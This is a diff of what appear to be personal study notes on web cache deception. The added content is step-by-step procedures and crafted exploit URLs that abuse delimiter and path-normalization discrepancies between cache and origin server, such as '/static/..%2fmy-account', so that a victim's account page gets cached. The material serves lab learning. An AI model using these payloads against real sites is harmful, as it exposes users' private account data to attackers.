@@ -2,56 +2,13 @@
 
 Web cache deception is a vulnerability where an attacker tricks a web cache into storing sensitive content due to differences in how cache and origin servers handle requests. The attacker lures a victim into visiting a malicious URL, causing the cache to mistakenly store private data as a static resource. The attacker can then access the cached response, gaining unauthorized access to the sensitive information.
 
-<details>
-
-<summary>Web caches</summary>
-
-A web cache is an intermediary system between the origin server and the user. When a client requests a static resource, the cache checks if it has a copy. If not (a cache miss), the request is sent to the origin server, which processes and responds.
-
-**Cache keys**
-
-When the cache gets an HTTP request, it decides whether to serve a cached response or forward the request to the origin server by generating a "cache key". Typically, this would contain the request line and `Host` header but can also include headers and content type.
-
-**Cache rules**
-
-Cache rules dictate what can be cached and for how long. They usually store static resources, which change infrequently and are used across multiple pages. Dynamic content isn't cached, as it often contains sensitive information, ensuring users receive the most up-to-date data from the server.
-
-* **Static file extension** rules match the file extensions of requested resources, like `.css` or `.js`&#x20;
-* **Static directory** rules match URL paths starting with a specific prefix, typically used for directories containing static resources, such as `/static` or `/assets`.&#x20;
-* **File name** rules target specific files that are essential and rarely change, like `robots.txt` and `favicon.ico`.
-* **Custom** rules
-
-</details>
+More info about web cache: [web-cache.md](../web-security/web-cache.md "mention")
 
 ## <mark style="color:yellow;">Constructing a web cache deception attack</mark> <a href="#constructing-a-web-cache-deception-attack" id="constructing-a-web-cache-deception-attack"></a>
 
-1. Identify a target endpoint returning dynamic responses with sensitive information. Focus on endpoints supporting GET, HEAD, or OPTIONS methods since requests that alter the server’s state are usually not cached.
-2. Identify a discrepancy in how the cache and origin server parse the URL path. This could be a discrepancy in how they:
-   * Map URLs to resources.
-   * Process delimiter characters.
-   * Normalize paths.
+1. Identify a target endpoint that returns dynamic responses with sensitive information, focusing on those supporting GET, HEAD, or OPTIONS methods, as they are typically cached
+2. Look for discrepancies in how the cache and origin server parse the URL path
 3. Craft a malicious URL to trick the cache into storing a dynamic response. When the victim accesses it, their data is cached. Use Burp to request the same URL and retrieve the cached response. Avoid using a browser to prevent redirects or data invalidation.
-
-<details>
-
-<summary>Using a cache buster</summary>
-
-When testing for discrepancies and crafting a web cache deception exploit, ensure each request has a unique cache key to avoid receiving cached responses, which could skew your results.
-
-Since the cache key typically includes the URL path and query parameters, change the key by adding a different query string with each request. Automate this with the Param Miner extension by selecting _Add dynamic cachebuster_ under the Param Miner > Settings menu in Burp. This will add a unique query string to every request, viewable in the Logger tab.
-
-</details>
-
-## <mark style="color:yellow;">Detecting cached responses</mark>
-
-* The `X-Cache` header indicates if a response came from the cache. Typical values include:
-  * `X-Cache: hit` - The response came from the cache.
-  * `X-Cache: miss` - The cache had no response for the request's key, so it was fetched from the origin server and, in most cases, cached. Send the request again to check if the value updates to "hit."
-  * `X-Cache: dynamic` - The origin server dynamically generated the content, making it generally unsuitable for caching.
-  * `X-Cache: refresh` - The cached content was outdated and needed refreshing or revalidation.
-* The `Cache-Control` header may include a directive that indicates caching, like `public` with a `max-age` that has a value over `0`. Note that this only suggests that the resource is cacheable. It isn't always indicative of caching, as the cache may sometimes override this header.
-
-If you notice a big difference in response time for the same request, this may also indicate that the faster response is served from the cache.
 
 ## <mark style="color:yellow;">Exploiting static extension cache rules</mark>
 
@@ -72,20 +29,22 @@ Consider the following example:
 
 </details>
 
-1. **Test URL path mapping**: add an arbitrary segment to the target URL. If the response remains the same, the server ignores the added segment. For example, `/api/orders/123/foo` (instead of `/api/orders/123`) still returning order information indicates this behavior.
-2. **Test how the cache maps URL paths**: modify the path by adding a static extension, like changing `/api/orders/123/foo` to `/api/orders/123/foo.js`. If the response is cached, it indicates:
-
-* The cache interprets the full URL path with the static extension.
-* There’s a cache rule for requests ending in `.js`.
-
-<pre class="language-sh"><code class="lang-sh">https://vulnerable.website.com/my-account        # Contains sensitive data -> Good endpoint
-<strong>https://vulnerable.website.com/my-account/abc    # The response is identical to the original -> REST-style 
-</strong>https://vulnerable.website.com/my-account/abc.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
-https://vulnerable.website.com/my-account/abc.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
+<pre class="language-sh"><code class="lang-sh"># 1. Find good endpoint
+/my-account        # Contains sensitive data -> Good endpoint
+<strong>
+</strong># 2. Check if web cache is used
+/test.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
+/test.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
+<strong>
+</strong><strong># 3. Check if origin server uses REST-style
+</strong><strong>/my-account/abc    # The response is identical to the original -> REST-style
+</strong><strong>
+</strong><strong># 4. Check if cache server uses traditional URL &#x26; explotation
+</strong>/my-account/abc.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
+/my-account/abc.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
 # Now https://vulnerable.website.com/my-account/abc.js contains your sensitive data cached
 
 # Find a way to send the victim on https://vulnerable.website.com/my-account/xyz.js
-
 # Note: I omitted cache buster for for simplicity
 </code></pre>
 
@@ -106,36 +65,37 @@ to do
 
 </details>
 
-Objective: identify a character that is used as a delimiter by the origin server but not the cache.
-
-1. First, identify delimiter characters used by the origin server. Begin by adding an arbitrary string to the URL, like changing `/settings/users/list` to `/settings/users/listaaa`. Use this response as a reference for testing delimiter characters.
-2. Next, add a possible delimiter character between the original path and the arbitrary string, such as `/settings/users/list;aaa`. (Use this list: [https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list))
-
-* If the response matches the base response, the `;` character is a delimiter, and the server interprets the path as `/settings/users/list`.
-* If the response matches the path with the arbitrary string, the `;` character isn’t a delimiter, and the server treats the path as `/settings/users/list;aaa`.
-
-3. After identifying delimiters used by the origin server, test if the cache uses them by adding a static extension to the path. If the response is cached, it means:
-
-* The cache doesn’t use the delimiter and interprets the full URL path with the static extension.
-* There’s a cache rule for responses ending in `.js`.
+Objective: identify a character that is used as a delimiter by the origin server but not the cache. Use this list: [https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list](https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list)
 
 ```sh
-https://vulnerable.website.com/my-account        # Contains sensitive data -> Good endpoint
-https://vulnerable.website.com/my-accountaaa     # 404 Not found
-https://vulnerable.website.com/my-account§§aaa   # Fuzz delimeter char. -> with ";" -> The response matches the original 
-https://vulnerable.website.com/my-account;abc.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
-https://vulnerable.website.com/my-account;abc.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
+# 1. Find good endpoint
+/my-account        # Contains sensitive data -> Good endpoint
+
+# 2. Check if web cache is used
+/test.js # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
+/test.js # 2 time "X-Cache: hit" -> Perfect, the page is cached
+
+# 3. Fuzz delimeter char
+/my-account§§aaa   # Fuzz delimeter char. -> with ";" -> The response matches the original
+
+# 4. Check if delimiter is not used by the cache
+/my-account        # "X-Cache: miss"
+/my-account;abc.js # "X-Cache: miss"
+# The cache thinks "my-account;abc" is the name and ".js" is the extension
+
+# 5. Exploitation
+/my-account;abc.js # 1 time "X-Cache: miss"
+/my-account;abc.js # 2 time "X-Cache: hit"
 # Now https://vulnerable.website.com/my-account;abc.js contains your sensitive data cached
 
 # Find a way to send the victim on https://vulnerable.website.com/my-account;xyz.js
-
 # Note: I omitted cache buster for for simplicity
 ```
 
 {% hint style="info" %}
 **Note**:&#x20;
 
-* because delimiters are generally used consistently within each server, you can often use this attack on many different endpoints.
+* Because delimiters are generally used consistently within each server, you can often use this attack on many different endpoints.
 *   Some delimiter characters may be processed by the victim's browser before it forwards the request to the cache. This means that some delimiters can't be used in an exploit. For example, browsers URL-encode characters like `{`, `}`, `<`, and `>`, and use `#` to truncate the path.
 
     If the cache or origin server decodes these characters, it may be possible to use an encoded version in an exploit.
@@ -146,8 +106,71 @@ https://vulnerable.website.com/my-account;abc.js # 2 time "X-Cache: hit" -> Perf
 
 to understand
 
-## <mark style="color:yellow;">Exploiting static directory cache rules</mark> <a href="#exploiting-static-directory-cache-rules" id="exploiting-static-directory-cache-rules"></a>
+## <mark style="color:yellow;">Exploiting static directory cache rules (Normalization discrepancies)</mark> <a href="#exploiting-static-directory-cache-rules" id="exploiting-static-directory-cache-rules"></a>
 
-Web servers often store static resources in specific directories. Cache rules typically target these by matching URL path prefixes like /static, /assets, /scripts, or /images.
+Web servers often store static resources in specific directories. Cache rules typically target these by matching URL path prefixes like `/static`, `/assets`, `/scripts`, or `/images`.
 
-\
+Premise
+
+* If you type in your browser `https://website/test/../account`, it'll make the following request `GET /account HTTP/2`. &#x20;
+* If you type in your browser`https://website/test/..%2faccount`, it'll make the following request `GET /test/..%2faccount HTTP/2`. &#x20;
+
+```sh
+# 1. Find good endpoint
+/my-account            # Contains sensitive data -> Good endpoint
+
+# 2. Check if web cache is used (with static resources)
+/static/js/info.js     # 1 time "X-Cache: miss" -> Ok, there should be a cache mechanism
+/static/js/info.js     # 2 time "X-Cache: hit" -> Perfect, the page is cached
+```
+
+### <mark style="color:yellow;">Exploiting normalization by the origin server</mark> <a href="#exploiting-normalization-by-the-origin-server" id="exploiting-normalization-by-the-origin-server"></a>
+
+<pre class="language-sh"><code class="lang-sh"># 3. Confirm that the cache rule is based on the static directory
+/static/../xxx         # 1 time "X-Cache: miss"
+/static/../xxx         # 2 time "X-Cache: hit" -> so all subpages in /static/ will be cached 
+
+# 4. Detecting normalization by the origin server
+/aaa/..%2fmy-account    # Returns the profile information -> The origin server decodes the slash and resolves the dot-segment
+
+# 5. Detecting normalization by the cache server
+/static/js/info.js     # 1 time "X-Cache: miss"
+/static/js%2finfo.js   # 2 time "X-Cache: miss" -> Cache isn't normalizing the path before mapping it to the endpoint
+# So the cache thinks "/static/js/info.js" is different from "/static/js%2finfo.js
+
+# 6. Exploiting
+/static/..%2fmy-account
+
+# The cache interprets the path as: /static/..%2fmy-account
+<strong># The origin server interprets the path as: /my-account
+</strong></code></pre>
+
+### <mark style="color:yellow;">Exploiting normalization by the cache server</mark>
+
+<pre class="language-sh"><code class="lang-sh"># 3. Confirm that the cache rule is based on the static directory
+# This step is useless, so you can't confirm if the cache decodes 
+# dot-segments and URL paths without trying an exploit.
+<strong>
+</strong><strong># 4. Detecting normalization by the origin server
+</strong>/aaa/..%2fmy-account    # Not found -> The origin server doesn't decode the slash and doesn't resolve the dot-segment
+
+# 5. Detecting normalization by the cache server
+/static/js/info.js     # 1 time "X-Cache: miss"
+/static/js/info.js     # 2 time "X-Cache: hit"
+/static/js%2finfo.js   # 2 time "X-Cache: hit" -> Cache has normalized the path
+# So the cache understand that they are the same path
+
+# 6. Identify a delimiter that is used by the origin server but not the cache
+/my-account§§aaa   # Fuzz delimeter char. -> with "%23" -> The response matches the original
+
+# 7. Check if delimiter is not used by the cache 
+/static/js/info.js        # "X-Cache: miss"
+/static/js/info.js%23aaa  # "X-Cache: miss"
+# So the cache thinks "info.js" is different from "info.js%23aaa"
+
+# 8. Exploitation
+/my-account%23%2f%2e%2e%2fstatic/js/info.js
+
+# The cache interprets the path as: /static
+# The origin server interprets the path as: /my-account
+</code></pre>
